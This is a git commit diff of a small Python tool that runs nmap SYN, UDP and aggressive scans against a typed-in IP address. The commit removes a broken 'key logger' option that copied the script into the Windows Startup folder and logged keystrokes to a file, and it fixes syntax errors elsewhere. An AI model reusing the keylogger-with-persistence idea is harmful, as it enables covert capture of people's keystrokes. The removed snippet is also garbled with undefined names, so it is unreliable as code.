2c970ddb36a8f9700e71021c6e78e26433f007d3
Yahye Abdirahman <68783841+fikrado@users.noreply.github.com>
2020-12-05 19:49:51 +0300

    Update Alpha.py

--- Alpha.py
+++ Alpha.py
@@ -1,12 +1,5 @@
 import nmap
 
-from pynput.keyboard import listener
- 
-import os 
-
-import logging 
-
-from shutil import copyfile 
 
 scanner = nmap.Portscanner()
 
@@ -32,54 +25,41 @@ logo = """
 """
 print("______________________________")
 print(logo)
-print("-------------------------------)
+print("-------------------------------")
 
 ip_addr = input(" Please enter ip address ")
-print(" The ip you enter is:"‚ip_addr)
+print(" The ip you enter is:", ip_addr)
 type(ip_addr)
 
 resp = input("""\nEnter the ip address you want to scan
-                  1:SYN ACK scan
+                  1:SYN ACK scan 
                   2:UDP scan
-                  3:Super scan
-                  4:key logger \n""")
-print("your option"‚ resp)
+                  3:Super scanner \n""")
+print("your option", resp)
 
 if resp == '1':
-  print("Nmap Version: "‚ scanner.nmap_version ())
-  scanner.scan(ip_addr‚ '1-1024'‚ '-v -sS')
-  print(scanner.scaninfo())
-  print("ip statu: "‚ scanner[ip_addr].state())
-  print(scanner[ip_addr].all_protocols())
-  print("open ports: "‚ scanner[ip_addr]['tcp'].keys())
+    print("Nmap Version: ", scanner.nmap_version())
+    scanner.scan(ip_addr, '1-1024', '-v -sS')
+    print(scanner.scaninfo())
+    print("ip statu: ", scanner[ip_addr].state())
+    print(scanner[ip_addr].all_protocols())
+    print("open ports: ", scanner[ip_addr]['tcp'].keys())
 
 elif resp == '2':
-  print("Nmap Version: "‚ scanner.nmap_version ())
-  scanner.scan(ip_addr‚ '1-1024'‚ '-v -sU')
-  print(scanner.scaninfo())
-  print("ip statu: "‚ scanner[ip_addr].state())
-  print(scanner[ip_addr].all_protocols())
-  print("open ports: "‚ scanner[ip_addr]['udp'].keys())
+    print("Nmap Version: ", scanner.nmap_version())
+    scanner.scan(ip_addr, '1-1024', '-v -sU')
+    print(scanner.scaninfo())
+    print("ip statu: ", scanner[ip_addr].state())
+    print(scanner[ip_addr].all_protocols())
+    print("open ports: ", scanner[ip_addr]['udp'].keys())
 
 elif resp == '3':
-  print("Nmap Version: "‚ scanner.nmap_version ())
-  scanner.scan(ip_addr‚ '1-1024'‚ '-v -sS -sV -A -O')
-  print(scanner.scaninfo())
-  print("ip statu: "‚ scanner[ip_addr].state())
-  print(scanner[ip_addr].all_protocols())
-  print("open ports: "‚ scanner[ip_addr]['tcp'].keys())
+    print("Nmap Version: ", scanner.nmap_version())
+    scanner.scan(ip_addr, '1-1024', '-v -sS -sV -A -O')
+    print(scanner.scaninfo())
+    print("ip statu: ", scanner[ip_addr].state())
+    print(scanner[ip_addr].all_protocols())
+    print("open ports: ", scanner[ip_addr]['tcp'].keys())
 
-elif resp == '4':
-  username = os.getlogin()
-  login_directory = f"c:/User{username}/Desktop"
-  copyfile('Scanner.py'‚f'c:/User/{username}/AppDate/Roaming/Microsoft/Startup/Scannee.py')
-  logging.basicConfig(filename=f"{logging_directory}/mylog.txt"‚ level=logging.DEBUG‚ format="%(asctime)s: %(message)s")
-  def key_handler(key):
-    logging.info(key)
-    
-    with Listener(on_pass=key hand) as listener:
-      listener.join()
-
-else resp >= '5':
-  print(logo)
-  print("please enter a real option")
+elif resp >= '4':
+    print("wrong option dude")
